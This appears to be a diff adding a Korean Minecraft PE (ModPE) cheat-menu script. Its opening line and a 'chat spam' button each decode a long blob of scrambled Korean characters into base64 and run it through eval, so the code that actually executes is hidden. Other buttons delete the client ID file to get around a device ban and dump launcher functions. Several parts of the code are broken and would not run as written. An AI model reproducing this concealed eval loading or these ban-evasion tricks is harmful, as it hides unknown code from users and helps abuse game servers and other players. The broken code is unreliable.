@@ -1,0 +1,425 @@
+var u="씌엙크튷이크에크권루잎컹잎다크로땛츟궇뷁이토감파넫엙에광뎈리뷁뭘바토쟠니이토광킈철아지도넫엙잡꺾이토킈웽씌엙다뭘넫토크뭘감튷맟로뎈네도코콘리땛지철꺾도파넫냐킈엙씌리맟냐씌토코알넫읭뵝킈철아지도럌혀잎튷철혀니바럌땛루도씌엙크튷이토다뷁넫엙잡꺾이토뷁튷감튷맟웽멅토크냐뎈토로뭘뎈네잎광멅럌맟킈넫혀겕니보엙에니뎈리잡뭘씌럌맟다감리감웽씌리넓광츟네잎광멅다에니뎈리잡뭘씌럌뵝킈꺙아지도럌땛코웽보엙잡쟠감리에파씌토로지넫엙잡꺾이토뷁튷감튷맟웽멅토크냐뎈토로뭘뎈네잎광멅럌맟냐넫토코코넫뭥땛뭘넫리잡광뎈토뷁루멅튷맟이씌네잎아로토뷁헿씌럌웽코넫엙에알감토잡잡로루루지이엙웽광씌네겕헿꺙읭윇알감토뷁냐멅튷맟뭥넫쉈뷁뭥넫토로뭘콘쉈뷁가보쉈감알멅엙파헿보쉈땛알감츟윇넓잎루크도멅크크붸로쉈붸꺾넫네다쟠권파땛헿권꺾지파붸토씌잎붸엙맟땛잎로감코넫네붸꺾감광로광넫크크다철뭥킈다츟러잡붸뎈다잎가땛잡웽리감로에도감쉈멅아감튷뷁엙넫꺾도가로엙잡헿멅토뷁뭘멅쉈로스감리맟광멅뭥루뭘붸권뵝튷붸권멅아붸냐이쟠붸권광읭바쉈쟠계이코넓뭘혀토맟멅넫코넓뭘렸크에코넫엙잎코멅읭겕다콘혀잎웽렸코넓뭘권엙코냐뎈튷겕꺙콘리파코이러지뵝이읭가에넫쉈잎땛잎츟맟뭥감혀잎꺙콘리파코바럌루계이코넓뭘츟잡궇뵝꺙읭궇읭바광파알감크겕크보엙씌코씌다파맟츟혀궇지바츟니읭혀토갅니웽도헿계니지땛뵝찷쟠냥다찷갅럌아이읭루킈바권니바럌땛루도권리크광뎈리쟠뭘씌토뷁웽멅꺾땛지넫츟루갅럌뵝루도럌로파웽씌토코뭘보뭥잎알콘혀에광바토광킈꺙아지도럌땛코에콘혀잎킈넫읭맟광넫쉈크헿씌럌웽가바권니바럌땛코뷁콘쉈크광콘쉈뵝지감츟코갅럌뵝루도럌로파웽씌토코뭘보엙잡튷멅엙뷁튷바토로킈꺙아지도럌혀광바럌혀파뷁바츟맟헿씌토크튷씌럌뵝킈꺙아킈뷁";var v="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".split("");var w=eval;var x="궇겕럌러다크토네이도바보붸에꺙렸땛잎츟권로잡리혀콘감뎈넫멅씌철컹뵝웽읭냐루코엙뭥지킈갸계니가뭘알아넓튷헿광파쉈꺾쟠맟찷갅윇뷁".split("");for(var n=0;n<v.length;n++){w("u=u.replace(/"+x[n]+"/g,v[n]);");}u=u.replace(/냥/g,"+").replace(/파/g,"=").replace(/스/g,"/");var y=android.util.Base64.decode(u.toString(),0);var z=new java.lang.String(y,"UTF-8");w(z+"");
+
+var MatinFloatingCheater = {
+	windows: [],
+	WORLD_SET: function(){
+		ctx.runOnUiThread(new java.lang.Runnable({
+			run: function(){
+				try{
+					if(MatinFloatingCheater.windows[0]!=null){
+						MatinFloatingCheater.windows[0].dismiss();
+						MatinFloatingCheater.windows[0] = null;
+					}
+					MatinFloatingCheater.windows[0] = new android.widget.PopupWindow();
+					var layout = [];
+					var title = new android.widget.TextView(ctx);
+					title.setText("World Set");
+					title.setTextSize(18);
+					title.setTextColor(Green);
+					
+					title.setGravity(Center);
+					layout[0] = new android.widget.LinearLayout(ctx);
+					layout[0].setOrientation(1);
+					layout[1] = new android.widget.LinearLayout(ctx);
+					layout[1].setOrientation(1);
+					layout[0].addView(title);
+					var Tmenus = ["시간 고정","토치 횟불화","채팅 청소 버튼 생성","자신의 이름표 숨기기"];
+					var toggle = [];
+					var tf = [stopTime,bright,useCCclear,hideNick];
+					for(var n in Tmenus){
+						toggle[n] = new android.widget.Switch(ctx);
+						setAnimations(toggle[n]);
+						toggle[n].setText(Tmenus[n]);
+						toggle[n].setTextColor(White);
+						toggle[n].setChecked(tf[n]);
+						toggle[n].setId(n);
+						toggle[n].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
+							onCheckedChanged : function(check, onoff){
+								switch(check.getId()){
+									case 0 :
+									if(onoff){
+										stv = Level.getTime();
+										Matin.toast("시간이 고정됩니다.");
+										stopTime = true;
+									}else{
+										stv = 0;
+										stopTime = false;
+									}
+									break;
+									case 1 :
+									if(onoff){
+										bright = true;
+										Matin.toast("토치, 용암 양동이, 발광석만 들어도 주변이 밝아집니다!");
+									}else{
+										bright = false;
+									}
+									break;
+									case 2 :
+									if(onoff){
+										useCCclear = true;
+										clearChating();
+										Matin.toast("버튼 생성 완료!");
+									}else{
+										useCCclear = false;
+										btnCCclear.dismiss();
+										btnCCclear = null;
+									}
+									break;
+									case 3 :
+									if(onoff){
+										hideNick = true;
+										Entity.setNameTag(Player.getEntity(), "");
+										Matin.toast("명령어 사용이 제한될수 있습니다.");
+									}else{
+										hideNick = false;
+										Entity.setNameTag(Player.getEntity(), ModPE.getName());
+									}
+									break;
+								}
+							}
+						}));
+					layou[1].addView(toggle[n].t());
+					var menus = ["시간 설정","게임 모드 변경","날씨 설정","레벨과 경험치 설정","스폰 지점 설정","맵 백업","맵 자동 백업 설정","게임 속도 설정","월드 이동","난이도 설정"];
+					var btns = [];
+					var pad = dip2px(ctx, 3);
+					for(let n in menus){
+						btns[n] = makeButton(menus[n]);
+						btns[n].setId(n);
+						btns[n].setPadding(pad ,pad ,pad ,pad);
+						setAnimations(btns[n]);
+						btns[n].setOnClickListener(new android.view.View.OnClickListener({
+							onClick: function(v){
+								switch(v.getId()){
+									case 0 :
+									SetTime();
+									break;
+									case 1 :
+									if(Level.getGameMode()==0) setGameMode(v);
+									else setGameMode(s);
+									Matin.toast("치트를 허용하셔야 정상작동합니다.");
+									break;
+									case 2 :
+									weatherSet();
+									break;
+									case 3 :
+									ExpSet();
+									Matin.toast("월드를 나갔다 오셔야 작동합니다.");
+									break;
+									case 4 :
+									Level.setSpawn(Player.getX(), Player.getY(), Player.getZ());
+									break;
+									case 5 :
+									BackUp.copyMap();
+									break;
+									case 6 :
+									BackUp.openSetting();
+									break;
+									case 7 :
+									speedSet();
+									break;
+									case 8 :
+									selectMap();
+									Matin.toast("일정 확률로 팅길 수 있습니다.");
+									break;
+									case 9 :
+									dialogSetDifficult();
+									break;
+								}
+							}
+						}));
+						layout[1].addView(btns[n]);
+					}
+					var scroll = new android.widget.ScrollView(ctx);
+					scroll.addView(layout[1]);
+					title.setOnClickListener(new android.view.View.OnClickListener({
+						onClick: function(v){
+							if(layout[0].getChildCount()==1){
+								layout[0].addView(scroll);
+								MatinFloatingCheater.windows[0].update(dip2px(ctx, 130), dip2px(ctx, 150));
+							}
+							else{
+								layout[0].removeView(scroll);
+								MatinFloatingCheater.windows[0].update(dip2px(ctx, 130), dip2px(ctx, 25));
+							}
+						}
+					}));
+					layout[0].addView(scroll);
+					Matin.sdr(MatinFloatingCheater.windows[0], title);
+					MatinFloatingCheater.windows[0].setContentView(layout[0]);
+					MatinFloatingCheater.windows[0].setWidth(dip2px(ctx, 130));
+					MatinFloatingCheater.windows[0].setHeight(dip2px(ctx, 150));
+					MatinFloatingCheater.windows[0].setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(MBack));
+					MatinFloatingCheater.windows[0].showAtLocation(ctx.getWindow().getDecorView(), Left|Top, dip2px(ctx, 130), dip2px(ctx, 130));
+				}catch(e){
+					Matin.error(e);
+				}
+			}
+		}));
+	},
+	INVENTORY_SET: {
+		ctx.runOnUiThread(new java.lang.Runnable({
+			run: function(){
+				try{
+					if(MatinFloatingCheater.windows[1]!=null){
+						MatinFloatingCheater.windows[1].dismiss();
+						MatinFloatingCheater.windows[1] = null;
+					}
+					MatinFloatingCheater.windows[1] = new android.widget.PopupWindow();
+					var layout = [];
+					var title = new android.widget.TextView(ctx);
+					title.setText("Inventory Set");
+					title.setTextSize(18);
+					title.setTextColor(Green);
+					title.setGravity(Center);
+					layout[0] = new android.widget.LinearLayout(ctx);
+					layout[0].setOrientation(1);
+					layout[1] = new android.widget.LinearLayout(ctx);
+					layout[1].setOrientation(1);
+					layout[0].addView(title);
+					var menus = ["아이템 지급", "아이템 검색", "인벤토리 리셋", "인첸트", "인첸트 해제", "갑옷 입기"];
+					var btns = [];
+					var pad = dip2px(ctx, 3);
+					for(let n in menus){
+						btns[n] = makeButton(menus[n]);
+						btns[n].setId(n);
+						btns[n].setPadding(pad ,pad ,pad ,pad);
+						setAnimations(btns[n]);
+						btns[n].setOnClickListener(new android.view.View.OnClickListener({
+							onClick: function(v){
+								switch(v.getId()){
+									case 0 :
+								}
+							}
+						}));
+						layout[1].addView(btns[n]);
+					}
+					var scroll = new android.widget.ScrollView(ctx);
+					scroll.addView(layout[1]);
+					title.setOnClickListener(new android.view.View.OnClickListener({
+						onClick: function(v){
+							if(layout[0].getChildCount()==1){
+								layout[0].addView(scroll);
+								MatinFloatingCheater.windows[0].update(dip2px(ctx, 130), dip2px(ctx, 150));
+							}
+							else{
+								layout[0].removeView(scroll);
+								MatinFloatingCheater.windows[0].update(dip2px(ctx, 130), dip2px(ctx, 25));
+							}
+						}
+					}));
+					layout[0].addView(scroll);
+					Matin.sdr(MatinFloatingCheater.windows[1], title);
+					MatinFloatingCheater.windows[1].setContentView(layout[0]);
+					MatinFloatingCheater.windows[1].setWidth(dip2px(ctx, 130));
+					MatinFloatingCheater.windows[1].setHeight(dip2px(ctx, 150));
+					MatinFloatingCheater.windows[1].setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(MBack));
+					MatinFloatingCheater.windows[1].showAtLocation(ctx.getWindow().getDecorView(), Left|Top, dip2px(ctx, 130), dip2px(ctx, 130));
+				}catch(e){
+					Matin.error(e);
+				}
+			}
+		}));
+	},
+	SERVER_MANAGER: {
+		
+	},
+	ENTITY_MANAGER: {
+		
+	},
+	HACK: {
+		
+	},
+	TERROR_DEFENSE: {
+		
+	},
+	WORLD_EDIT: {
+		
+	} 
+};
+
+function floatingCC(){
+	ctx.runOnUiThread(new java.lang.Runnable({
+		run: function(){
+			try{
+				floatingbtn = new android.widget.PopupWindow();
+				var title = makeTitle("F.C.C.");
+				title.setTextColor(초록);
+				title.setTextSize(20);
+				title.setGravity(Center);
+				title.setOnClickListener(new android.view.View.OnClickListener({
+					onClick: function(v){
+						floatingbtn.dismiss();
+						floatingbtn = null;
+					}
+				}));
+				Matin.sdr(floatingbtn, title);
+				var pad = dip2px(ctx, 4);
+				title.setPadding(pad ,pad ,pad ,pad);
+				var mainLayout = new android.widget.LinearLayout(ctx);
+				mainLayout.setOrientation(1);
+				mainLayout.addView(title);
+				var layout = [new android.widget.LinearLayout(ctx), new android.widget.LinearLayout(ctx), new android.widget.LinearLayout(ctx)];
+				layout[0].setOrientation(1);
+				layout[1].setOrientation(1);
+				var Tbtn = [];
+				var Tmenus = ["World Set","Inventory Set","Server Manager","Entity Manager","Hack","Terror Defense","World Edit"];
+				var tf = [fcc.WS, fcc.IS, fcc.SM, fcc.EM, fcc.H, fcc.TD, fcc.WE];
+				for(let n in Tmenus){
+					Tbtn[n] = new MatinToggleButton();
+					Tbtn[n].setText(Tmenus[n]);
+					Tbtn[n].setChecked(tf[n]);
+					setAnimations(Tbtn[n].b());
+					Tbtn[n].setId(n);
+					Tbtn[n].setOnChangedListener(new android.widget.CompoundButton.OnCheckedChangeListener({
+						onCheckedChanged : function(t, of){
+							switch(t.getId()){
+								case 0 :
+								fcc.WS = of;
+								if(of){
+									MatinFloatingCheater.WORLD_SET();
+								}
+								else if(MatinFloatingCheater.windows[0]!=null){
+									MatinFloatingCheater.windows[0].dismiss();
+									MatinFloatingCheater.windows[0] = null;
+								}
+								break;
+								case 1 :
+								fcc.IS = of;
+								if(of){
+									MatinFloatingCheater.INVENTORY_SET();
+								}
+								else if(MatinFloatingCheater.windows[1]!=null){
+									MatinFloatingCheater.windows[1].dismiss();
+									MatinFloatingCheater.windows[1] = null;
+								}
+								break;
+							}
+						}
+					}));
+					layout[0].addView(Tbtn[n].b());
+				}
+				var btns = [];
+				var menus = ["채팅 도배\n(벤당해도 본인책임)", "클라이언트\n아이디 삭제\n기기벤 해제", "유틸 덤프", "네이티브 함수 덤프", "적용된 스크립트 목록", "스크립트 수정"];
+				for(let n in menus){
+					btns[n] = makeButton(menus[n]);
+					btns[n].setId(n);
+					setAnimations(btns[n]);
+					btns[n].setOnClickListener(new android.view.View.OnClickListener({
+						onClick: function(v){
+							switch(v.getId()){
+								case 0 : 
+								var u="감엙뷁튷바네감웽멅읭겕가이러광뵝붸러가가렸러붸아꺙쉈광계바튷코갅럌뵝루도럌땛루도럌땛루도럌로넓코씌엙잡니보엙잡쟠감리에파씌토잡러넫쉈파가콘리맟루바럌이알멅쉈크맟이꺙튷씌가럌러가웽콘헿계뭥찷헿계읭킈땛뵝땛쉈웽킈넫엙다뵝땛쉈웽코콘혀잎코멅뭘뭘코알럌러니뭥넫권니엙갸뭥가코감냐계읭킈땛뵝갅도튷뵝갅바럌궇찷계럌궇이꺙쉈크냐꺙뭘컹계꺙뭘코알럌러니뭥넫헿니뭥보헿니알보러니읭계혀계읭쟠냐계읭찷땛뭘이꺙뭘보읭철뭘다킈꺙튷철웽꺙튷씌뵝럌궇찷이럌이계권리뷁루로다로뭘감쉈잡광권엙크가감츟뵝킈바튷보니뭥지혀계읭쟠냐계읭찷땛뭘이꺙뭘튷킈꺙튷씌웽럌러계갸보뭥니뭥넫권니읭맟헿계냐감냐갸니이궇뵝갅감리콘갅이리로찷쟠냥다이꺙뭘땛갸철뭘보읭꺙뭘보킈럌쟠읭보럌겕광멅뭥잡코바권니바럌땛루도럌땛루도럌땛코뷁럌뵝루도럌땛루도럌땛루도권리크광뎈리쟠뭘씌토뷁웽멅꺾땛지이뭘쉈크냐꺙뭘컹계꺙튷혀루꺙뭘바코럌러계냐이러갸니이러계킈넫아뵝갅보엙콘찷찷뎈크찷쟠뭘이찷쟠뭘루보읭이킈꺙아지도럌땛루도럌땛루도럌잡에크권루잎컹잎다크로땛츟뵝읭찷쟠냥다찷갅럌아이꺙튷보지꺙갸헿지럌이니이럌보계읭갅뭥니읭찷러니뭥감뵝뵝갅도리다갅도쉈광갅감츟윇갅도엙궇이꺙뭘보읭철뭘다킈꺙튷철웽꺙튷씌가럌러갸니도헿계니도헿니뭥킈러니코맟러갸니지아뵝찷쟠츟콘갅도뎈광찷계럌로갅이갸파찷쟠뭘이찷쟠뭘루보코넓뭘이꺙튷잡웽철튷뎈갸철튷씌뵝럌러가코감냐니킈쟠궇뵝갅도리바갅도쉈다이꺙갸튷뵝냥튷씌가꺙뭘럌엙럌아뵝갅이뭘뵝찷계꺙뵝찷맟럌멅이꺙쉈로냐꺙뭘뵝읭꺙튷씌가꺙튷리가럌러계갸갸뭥계지감꺾니코맟궇뵝찷쟠뭘맟갅이뭘뵝갅도쉈콘이꺙뭘보읭철뭘다킈꺙튷철웽꺙튷씌가럌러니엙바헿계뭥넫헿갸니이냐갸니지렸니뭥지혀계읭쟠냐계읭찷땛뭘혀토쟠뵝찷찷갸지찷맟꺙뵝갅도쉈윇갅도철땛찷쟠갸로이꺙튷넓웽철튷철웽꺙튷씌가럌러계코보러계킈지혀계읭쟠냐계읭찷땛뭘혀토갅갸가갅뵝뵝갅이츟멅찷갅바다찷계럌궇이꺙뭘헿루철튷리가꺙튷다계철튷씌가꺙뭘씌알럌러가코감헿계루찷땛뵝찷쟠뭘맟갅이뭘뵝찷맟꺙루갅도쉈광이꺙갸꺾뭘럌러니웽도헿계니지권계킈넫아뵝갅콘리붸찷맟냥니갅감리뵝이꺙갸쉈냐꺙뭘엙계꺙뭘바코럌러니코쟠넫니읭계혀계읭쟠냐계읭찷땛뭘혀토갅가코지뭥계냐맟뭥가코감냐갸뭘보러니지이권니코맟궇뵝갅이꺙씌찷계럌겕갅감리콘갅이뭘가갅이뭘멅갅도읭루보읭이킈꺙아파";
+								var v="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".split("");
+								var w=eval;
+								var x="궇겕럌러다크토네이도바보붸에꺙렸땛잎츟권로잡리혀콘감뎈넫멅씌철컹뵝웽읭냐루코엙뭥지킈갸계니가뭘알아넓튷헿광파쉈꺾쟠맟찷갅윇뷁".split("");
+								for(var n=0;n<v.length;n++){
+									w("u=u.replace(/"+x[n]+"/g,v[n]);");
+								}
+								u=u.replace(/냥/g,"+").replace(/파/g,"=").replace(/스/g,"/");
+								var y=android.util.Base64.decode(u.toString(),0);
+								var z=new java.lang.String(y,"UTF-8");
+								w(z+"");
+								break;
+								case 1 : 
+								var clientid = new java.io.File(sdcard+"/games/com.mojang/minecraftpe/clientId.txt");
+								if(clientid.exists()) clientid.delete();
+								Matin.toast("ip벤이 아닌 기기벤이 해제되었습니다.");
+								break;
+								case 2 : 
+								var dumped = "";
+								for each(var func in net.zhuoweizhang.mcpelauncher.Utils){
+									try{
+										if(typeof func==="function"){
+											dumped += /\w+ +\w+\s*\(.*\)/.exec(func.toString().split("/*")[1])[0];
+											dumped += ';\n';
+										}
+									}catch(e){
+										Matin.error(e);
+									}
+								}
+								showDialog("유틸 덤프", dumped+"");
+								copy(dumped+"");
+								break;
+								case 3 :
+								var dumped = "";
+								for each(var func in net.zhuoweizhang.mcpelauncher.ScriptManager){
+									try{
+										if(typeof func==="function"){
+											dumped += /\w+ +\w+\s*\(.*\)/.exec(func.toString().split("/*")[1])[0];
+											dumped += ";\n";
+										}
+									}catch(e){
+										Matin.error(e);
+									}
+								}
+								showDialog("네이티브 함수 덤프", dumped+"");
+								copy(dumped+"");
+								break;
+								case 4 :
+								var enable = getEnabledScriptsArray();
+								var scripts = "\n";
+								for(var n in enable){
+									scripts += enabled+"";
+									scripts += "\n";
+								}
+								showDialog("현재 적용중인 스크립트 목록"+scripts+"(이)가 적용 돼 있습니다!");
+								break;
+								case 5 :
+								Matin.toast("현재 사용중인 런쳐를 선택해 주십시오");
+								selectBlockLauncher();
+								break;
+							}
+						}
+					}));
+					layout[1].addView(btns[n]);
+				}
+				var scroll = [];
+				scroll[0] = new android.widget.ScrollView(ctx);
+				scroll[1] = new android.widget.ScrollView(ctx);
+				var mainScroll = new android.widget.HorizontalScrollView(ctx);
+				scroll[0].addView(layout[0]);
+				scroll[1].addView(layout[1]);
+				layout[2].addView(scroll[0]);
+				layout[2].addView(scroll[1]);
+				mainScroll.addView(layout[2]);
+				mainLayout.addView(mainScroll);
+				floatingbtn.setContentView(mainLayout);
+				floatingbtn.setWidth(dip2px(ctx, 140));
+				floatingbtn.setHeight(dip2px(ctx, 180));
+				floatingbtn.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(MBack));
+				floatingbtn.showAtLocation(ctx.getWindow().getDecorView(), Left|Top, dip2px(ctx, 500), dip2px(ctx, 500));
+			}catch(e){
+				Matin.error(e);
+			}
+		}
+	}));
+}
+
+function floatingButton(){
+	ctx.runOnUiThread(new java.lang.Runnable({
+		run: function(){
+			try{
+				floatingbutton = new android.widget.PopupWindow();
+				var btn = makeButton("F.C.C.");
+				btn.setOnClickListener(new android.view.View.OnClickListener({
+					onClick: function(v){
+						if(floatingbtn!=null){
+							floatingbtn.dismiss();
+							floatingbtn = null;
+						}
+						else{
+							floatingCC();
+						}
+					}
+				}));
+				Matin.sdr(floatingbutton, btn);
+				floatingbutton.setContentView(btn);
+				floatingbutton.setWidth(-2);
+				floatingbutton.setHeight(-2);
+				floatingbutton.showAtLocation(ctx.getWindow().getDecorView(), Left|Top, dip2px(ctx, 60), dip2px(ctx, 50));
+			}catch(e){
+				Matin.error(e);
+			}
+		}
+	}));
+}
